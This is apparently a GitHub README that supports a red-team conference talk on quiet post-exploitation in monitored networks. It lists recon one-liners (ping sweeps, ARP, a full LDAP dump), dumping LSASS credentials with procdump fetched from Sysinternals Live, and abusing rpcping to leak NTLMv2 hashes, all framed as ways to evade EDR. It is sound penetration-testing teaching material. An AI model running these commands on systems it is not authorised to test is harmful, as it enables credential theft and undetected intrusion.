![fenrir-desktop-bg](https://user-images.githubusercontent.com/8293038/133816238-7152221b-c37d-46ca-831d-ff636178f44f.png)

# Move in Silence: Staying Quiet in Mature Networks

This repo is supplemental material for my presentation for Wild West Hackin Fest's Way West conference in San Diego in 2022. 

- [Twitter](https://twitter.com/cwolff411)
- [Discord](https://discordapp.com/users/354713402733494283)
- [LinkedIn](https://linkedin.com/in/corywolff)
- Email me at yxakl5mae@relay.firefox.com

## Abstract
Security Operations Centers and event monitoring have advanced by leaps and bounds in the past decade. While this is a good thing for cybersecurity as a whole, as red teamers and penetration testers, this means that Metasploit payloads and common tools simply won’t work. Any attempt to drop tools like Mimikatz or Responder will be contained by even the most basic of Antivirus and EDR. Want to kick off an Nmap scan and recon the network? Good luck with that! 

This presentation focuses on ways to accomplish required tasks in a quiet manner. It will focus on performing network reconnaissance while emulating typical user behavior, performing the same tasks as common tools with alternative methods, obfuscating our code, and executing the same techniques as some of the worlds most advanced threat actors – all while staying quiet.

## Things to Know
Everything in this discussion is based around post-exploitation scenarios, meaning that you have already landed on a machine, escalated privileges, and are looking to move throughout the network.

## Recon Subnets
### Use arp
`arp -a`

### Ping broadcast address
`ping -b x.x.x.255`

### Ping sweep on command line

#### Powershell:
`1..254 | % {"192.168.1.$($_): $(Test-Connection -count 1 -comp 192.168.1.$($_) -quiet)"}`

#### bash:
```for i in \seq 1 255`; do ping -c 1 192.168.1.$i | tr \\n ' ' | awk '/1 received/ {print $2}'; done```

## Recon Active Directory
### ldapsearch

#### Dump all of LDAP
`ldapsearch -x -h x.x.x.x -b "DC=contoso,DC=com"`

<img width="801" alt="Screen Shot 2022-05-05 at 10 55 51 AM" src="https://user-images.githubusercontent.com/8293038/166986099-720a17d1-6600-49ef-ba11-b0769c1044eb.png">


<img width="827" alt="Screen Shot 2022-05-05 at 10 56 31 AM" src="https://user-images.githubusercontent.com/8293038/166986118-69fcf0f3-e167-4887-b651-35c570e2c283.png">

#### Parse machines from LDAP and perform nslookup 
[https://github.com/dirkjanm/ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump)

<img width="1008" alt="Screen Shot 2022-05-05 at 12 50 28 PM" src="https://user-images.githubusercontent.com/8293038/166986128-9f3b867a-76ca-4941-b8da-4f7fa289cead.png">

## Lateral Movement/Priv Esc
### Dumping LSASS with procdump
Be fancy and use it from Sysinternals Live
`\\live.sysinternals.com\tools\procdump -ma lsass.exe OUTFILE.dmp`

Or download procdump from [https://docs.microsoft.com/en-us/sysinternals/](https://docs.microsoft.com/en-us/sysinternals/) and do it same as above

### Getting NTLMv2 hashes with rpcping
`rpcping` is a lolbin that will allow you to send an authenticated rpc ping to a remote host along with the current users NTLMv2 hash. Use it when you pop a shell, but don't know the compromised users password.

[Check out the lolbas page on it](https://lolbas-project.github.io/lolbas/Binaries/Rpcping/)

### Creating SSL Tunnels

I've talk about this before in my presentation for Red Team Village. Check it out [here](https://github.com/cwolff411/RedTeamVillage-SSHTunnels/tree/main/stunnel)

## Resources

- [Ippsec dumping LDAP with ldapsearch on HTB Forest machine](https://www.youtube.com/watch?v=H9FcE_FMZio&t=340)
- [Use ldapdomaindump to dump LDAP and lookup IPs](https://github.com/dirkjanm/ldapdomaindump)
- [Detecting Bloodhound](https://medium.com/securonix-tech-blog/detecting-ldap-enumeration-and-bloodhound-s-sharphound-collector-using-active-directory-decoys-dfc840f2f644)
- [Working with stunnel](https://github.com/cwolff411/RedTeamVillage-SSHTunnels/tree/main/stunnel)
- [The classic Linux priv esc checklist from g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [Active Directory Recon Without Admin Rights](https://adsecurity.org/?p=2535) **probably not OPSEC safe**
- [SMB Enumeration Guide](https://steflan-security.com/smb-enumeration-guide/)
- [Active Directory Organizational Units](https://theitbros.com/active-directory-organizational-unit-ou/)